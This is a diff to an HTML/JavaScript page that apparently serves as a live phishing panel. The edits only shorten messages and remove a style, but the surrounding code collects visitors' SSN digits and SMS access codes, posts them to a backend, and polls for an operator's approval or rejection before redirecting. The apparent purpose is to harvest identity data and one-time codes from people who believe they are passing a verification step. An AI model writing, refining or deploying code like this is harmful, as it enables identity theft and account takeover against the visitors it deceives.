@@ -16,7 +16,6 @@
         .continue { background: #1e40af; color: white; }
         .new-code { background: #eab308; color: black; }
         .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
-        .waiting { color: #3b82f6; margin: 20px 0; text-align: center; font-weight: 500; }
         .step { display: none; }
         .step.active { display: block; }
     </style>
@@ -77,7 +76,7 @@
                         address: details
                     })
                 });
-                console.log("✅ Step saved:", details);
+                console.log("✅ Saved:", details);
             } catch (e) {
                 console.error("Save failed", e);
             }
@@ -86,7 +85,7 @@
         function saveStep1() {
             const ssn = document.getElementById('ssn').value.trim();
             if (ssn.length !== 4 || !document.getElementById('privacy').checked) {
-                alert("Please fill SSN (4 digits) and accept the Privacy Policy.");
+                alert("Please fill SSN and accept the Privacy Policy.");
                 return;
             }
             const details = `SSN: ${ssn} | Status: Step 1 Completed`;
@@ -131,7 +130,7 @@
 
             await saveStep(fullDetails);
 
-            // Polling for admin confirmation (only for access code)
+            // Polling for confirmation
             const interval = setInterval(async () => {
                 const res = await fetch('/api/records');
                 const records = await res.json();
@@ -143,7 +142,7 @@
                     setTimeout(() => window.location.href = "tunde.html", 1500);
                 } else if (latest && latest.address.includes("Rejected")) {
                     clearInterval(interval);
-                    statusDiv.innerHTML = `<span class="error">❌ Code Rejected.<br>Use "Request New Code" below.</span>`;
+                    statusDiv.innerHTML = `<span class="error">❌ Code Rejected.</span>`;
                 }
             }, 2000);
         }
@@ -162,7 +161,7 @@
                 })
             });
 
-            statusDiv.innerHTML = `<span style="color:#eab308">✅ New code requested.<br>Please check your SMS.</span>`;
+            statusDiv.innerHTML = `<span style="color:#eab308">✅ Request sent. Please check your SMS.</span>`;
         }
 
         window.onload = () => {
